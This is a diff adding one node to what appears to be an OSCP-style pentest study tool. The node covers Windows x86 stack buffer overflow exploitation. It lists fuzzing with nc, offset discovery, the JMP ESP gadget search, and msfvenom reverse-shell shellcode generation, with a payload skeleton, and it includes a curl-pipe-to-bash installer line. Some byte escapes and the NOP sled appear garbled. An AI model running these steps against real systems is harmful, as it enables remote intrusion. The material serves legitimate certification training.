@@ -1,0 +1,22 @@
+{
+  "id": "bof",
+  "phase": "SHELL",
+  "title": "Buffer Overflow (Windows x86)",
+  "body": "Stack-based BOF: fixed buffer on stack, input larger than buffer overwrites adjacent memory including the return address. When the function ends, ret pops return address into EIP — control that value, control execution. Flow: (1) large buffer triggers overflow, (2) padding fills to exact offset, (3) return address overwritten with JMP ESP gadget, (4) JMP ESP redirects to ESP which points into shellcode on the stack. ASLR/DEP are out of scope for PEN-200 BOF exercises.",
+  "cmd": "# ── GEF — modern GDB for Linux BOF (Kali 2026.1) ────\n# Install: pip3 install gef --break-system-packages\n# Or: bash -c \"$(curl -fsSL https://gef.blah.cat/sh)\"\ngdb -q ./vulnerable_binary\n# In GDB with GEF:\ngef➤  pattern create 200    # generate cyclic pattern\ngef➤  run                   # crash it\ngef➤  pattern offset $eip   # find offset automatically\ngef➤  checksec              # ASLR/NX/PIE/stack canary check\ngef➤  info functions        # list all functions\ngef➤  disas main            # disassemble\ngef➤  x/32wx $esp           # examine stack\n\n# Immunity Debugger (Windows BOF) — still the standard on OSCP\n# !mona findmsp             # find EIP offset\n# !mona jmp -r esp          # find JMP ESP\n\n# -- FUZZ — find crash length -----------------\npython3 -c \"print('A' * 2000)\" | nc $ip <PORT>\n# Increment by 100 until crash\n\n# -- FIND EXACT OFFSET ------------------------\nmsf-pattern_create -l 2000 > pattern.txt\n# Send pattern, note EIP value in Immunity Debugger\nmsf-pattern_offset -l 2000 -q <EIP_VALUE>\n\n# -- CONFIRM EIP CONTROL ----------------------\n# Send: padding + BBBB + CCCC... — confirm EIP = 42424242\n\n# -- BAD CHARS --------------------------------\n# Send \u0001-ÿ after EIP, compare memory dump\n# Common: \u0000 (null), \n (LF), \r (CR)\n\n# -- FIND JMP ESP GADGET ----------------------\n# In Immunity Debugger:\n!mona jmp -r esp -cpb \"\u0000\"\n# Or with nasm: jmp esp = opcode FFE4\n\n# MUST be from a NON-ASLR module inside the vulnerable app\n# View → Executable Modules → confirm no ASLR / SafeSEH\n# Never use ntdll/kernel32 — randomized at every boot\n# If exploit DLL absent on target (e.g. msvbvm60.dll):\n#   check Python version of same exploit for verified addr\n#   or copy DLLs to Kali and search:\nobjdump -D target.dll | grep -i \"jmp.*esp\"\n\n# -- GENERATE SHELLCODE -----------------------\nmsfvenom -p windows/shell_reverse_tcp   LHOST=$lhost LPORT=$lport EXITFUNC=thread   -f py -e x86/shikata_ga_nai   -b \"\u0000\n\r\"    # all bad chars here\n\n# -- FINAL EXPLOIT STRUCTURE ------------------\noffset   = EXACT_OFFSET\npadding  = b\"A\" * offset\neip      = b\"ª»ÌÝ\"  # JMP ESP addr — little endian (replace with actual)\nnop_sled = b\"\" * 16             # NOP slide before shellcode\nbuf      = b\"PASTE_MSFVENOM_BUF\"\npayload  = padding + eip + nop_sled + buf",
+  "warn": "JMP ESP must come from non-ASLR module in the vulnerable app — never ntdll/kernel32 (randomized at boot). NOP sled ( * 16) gives shikata decoder room. EXITFUNC=thread keeps service alive. Rotated EIP (expected 0x10090c83, got 0x9010090c) = off-by-one null byte — C null-terminates strings so memset(buf+size-1, 0x00) shrinks buffer by 1. Fix: increase buffer size by 1.",
+  "choices": [
+    {
+      "label": "Exploit worked — got shell",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Need to fix a public C exploit",
+      "next": "exploit_fix_c"
+    },
+    {
+      "label": "Shell died — try EXITFUNC=thread",
+      "next": "bof"
+    }
+  ]
+}
